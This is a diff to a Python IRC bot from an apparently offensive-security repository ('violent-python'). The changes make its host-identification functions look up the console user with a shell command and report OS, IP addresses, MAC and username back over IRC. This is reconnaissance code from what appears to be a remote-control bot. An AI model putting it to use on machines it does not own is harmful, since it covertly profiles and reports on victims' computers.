@@ -14,7 +14,7 @@ from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
 
-version = "2.0.0"                                                   # bot version
+version = "2.0.1"                                                   # bot version
 
 def log(prefix, content=''):                                        # function used to log things to the console with a timestamp
     try:
@@ -256,24 +256,28 @@ def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates t
          raise SystemExit(0)
 
 def identify():                                                   # give some identifying info about the host computer
-   log('[+] Running Identification Scripts...')
-   import platform
-   system = platform.mac_ver()[0]
-   if len(str(system)) < 1:
-      system = platform.platform()
-   log('[>]    OS X:    ',system)
-   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-   s.connect(("8.8.8.8",80))
-   local_ip = s.getsockname()[0]
-   s.close()
-   log('[>]    Local:   ',local_ip)
-   import urllib2
-   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
-   log('[>]    Public:  ',public_ip)
-   import uuid
-   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-   log('[>]    MAC:     ',mac_addr)
-   return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), local_user.strip(), hostname, local_ip, public_ip, mac_addr)
+    log('[+] Running Identification Scripts...')
+    import platform
+    system = platform.mac_ver()[0]
+    if len(str(system)) < 1:
+        system = platform.platform()
+    log('[>]    OS X:    ',system)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8",80))
+    local_ip = s.getsockname()[0]
+    s.close()
+    log('[>]    Local:   ',local_ip)
+    cmd = "stat -f '%u %Su' /dev/console | awk  '{print $2}'"
+    for line in run_shell(cmd):
+        log('[>]    User:    ',line)
+        main_user = line.strip()
+    import urllib2
+    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    log('[>]    Public:  ',public_ip)
+    import uuid
+    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+    log('[>]    MAC:     ',mac_addr)
+    return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), main_user, hostname, local_ip, public_ip, mac_addr)
 
 def full_identify():                                              # give verbose identifying info about the host computer
    log('[+] Running Identification Scripts...')
@@ -310,7 +314,7 @@ def full_identify():                                              # give verbose
       log('[>]    UP:    ',line)
       privmsg('[>]      Up:    %s' % line)
 
-   cmd = "cd /Users/; du -s * 2>/dev/null | sort -nr | head -1 | awk  '{print $2}'"
+   cmd = "stat -f '%u %Su' /dev/console | awk  '{print $2}'"
    for line in run_shell(cmd):
       log('[>]    User:    ',line)
       privmsg('[>]      User:    %s' % line)
@@ -328,9 +332,9 @@ def full_identify():                                              # give verbose
 if __name__ == '__main__':
     if len(nick) > 15: nick = '[%s]' % (local_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
     last_ping = time.time()                                       # last ping recieved
-    threshold = 5 * 60                                            # maximum time between pings before assuming disconnected
+    threshold = 8 * 60                                            # maximum time between pings before assuming disconnected
     quit_status = False
-    
+
     while not quit_status:
         timeout_count = 0
         last_data = data = ''
